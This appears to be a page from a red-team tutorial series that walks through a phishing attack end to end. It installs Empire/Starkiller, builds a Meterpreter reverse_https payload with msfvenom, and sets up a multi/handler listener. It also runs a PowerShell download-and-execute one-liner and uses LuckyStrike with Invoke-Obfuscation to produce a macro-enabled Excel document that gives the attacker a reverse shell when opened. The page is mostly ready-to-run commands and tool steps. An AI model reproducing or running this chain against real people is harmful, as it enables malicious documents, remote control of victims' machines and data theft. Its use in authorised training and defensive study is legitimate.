# Exploitation

Now we are in the exploitation phase and all the tools list that are being used and their techniques are documented in the MITRE attack website which is linked below.

{% embed url="https://attack.mitre.org/" %}
It has all the techniques from exploitation to persistence to [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)
{% endembed %}

So our phishing scenario will be :

1- Generate malicious document using luckystrike&#x20;

2- Send to the victim

3- Victim will open the document

4- C2 server will receive reverse connection through empire/metasploit



Now firstly we will install empire server in our kali linux so for that we will use the following command.

```
// sudo apt update
// sudo apt install -y powershell-empire starkiller
```

After that the installation is complete you can start the server by

```
// sudo powershell-empire server 
                and on the other tab type
// sudo powershell-empire client
```

After it will connect to the localhost you can also use the gui version of the starkiller in the browser.Simply open the localhost which is your machine ip on port 1337. It will ask you for credentials the default are **USERNAME::empireadmin  PASSWORD::password123.**

<figure><img src="../.gitbook/assets/Windows Red Team Exploitation Techniques _ Red Team Series 3-13 - YouTube - Brave 05-07-2023 00_36_51.png" alt=""><figcaption><p>Login Screen</p></figcaption></figure>

After you log in you will be redirected to the home page.

<figure><img src="../.gitbook/assets/Windows Red Team Exploitation Techniques _ Red Team Series 3-13 - YouTube - Brave 05-07-2023 00_36_59.png" alt=""><figcaption></figcaption></figure>

After that the first step is to start the csharp server by clicking on the **plugin tab > csharp server  > click start.**

Now click on listener **select http as type and select port 1335** and leave all as it is and click on submit.

Now go on **stagers > create > type windows/csharp\_exe > select listener http and you can also change the outfile name such as empire.exe > click submit, and download the payload.**

Now open terminal and we will be creating a metasploit payload also.

```shell
// msfvenom -p windows/meterpreter/reverse_https LHOST=(your ip) LPORT=8080 -f exe > payload.exe

```

After the payload is created we will set up the msfconsole

<pre class="language-sh" data-line-numbers><code class="lang-sh">msfconsole
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST (your ip)
set LPORT 8080
<strong>run
</strong></code></pre>

**Save both the payloads in same folder.And start the python server and download both the payloads in the windows machine.**

```
python3 -m http.server 8888
```

Now in the windows machine we will be downloading luckystrike&#x20;

Open powershell in the adminstrator mode and move to desktop and copy & paste the following command&#x20;

{% code fullWidth="true" %}
```powershell
// iex (new-object net.webclient).downloadstring('https://git.io/v7kbp')

```
{% endcode %}

But in order to run it properly download the github repository and extract it and paste it into Documets > WindowsPowerShell > Modules (if modules folder is not there create one)

```
// https://github.com/danielbohannon/Invoke-Obfuscation.git
```

Now open powershell administrator in this folder and then follow the command&#x20;

```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

and now open the luckystrike and it will run with no errors

```powershell
// .\luckstrike.ps1
```

**Now click 2-Catalog options > 1-Add payload to catalog > Title: Meterpreter https > leave all options > click executable in payload type and enter the path where the payload is stored > Now click on Main Menu.**

<figure><img src="../.gitbook/assets/Windows Red Team Exploitation Techniques _ Red Team Series 3-13 - YouTube - Brave 05-07-2023 01_51_09.png" alt=""><figcaption></figcaption></figure>

**Now go back choose 99 > select payload options > select the document type xls > and the select the meterpreter payload > choose the infection to certutil.**

<figure><img src="../.gitbook/assets/Windows Red Team Exploitation Techniques _ Red Team Series 3-13 - YouTube - Brave 05-07-2023 01_55_13.png" alt=""><figcaption></figcaption></figure>

Now again go back in the main menu.

And click on file options > generate new file > and the file will be successfully created

```
// (Note: You need to install the microsoft office or the luckystrike will not generate the payload) which you find out easily on the internet.
```

Now repeat the same steps as above to generate the second payload and open the payload and in the microsoft excel and enable the macros and you will get the reverse connection to your attacker machine.

<figure><img src="../.gitbook/assets/Windows Red Team Exploitation Techniques _ Red Team Series 3-13 - YouTube - Brave 05-07-2023 02_02_26.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Windows Red Team Exploitation Techniques _ Red Team Series 3-13 - YouTube - Brave 05-07-2023 02_02_38.png" alt=""><figcaption></figcaption></figure>

You can run shell commands and browse files from the starkiller as well as the msfconsole.

That's all in this chapter we will cover topics and techniques more in the other chapters.
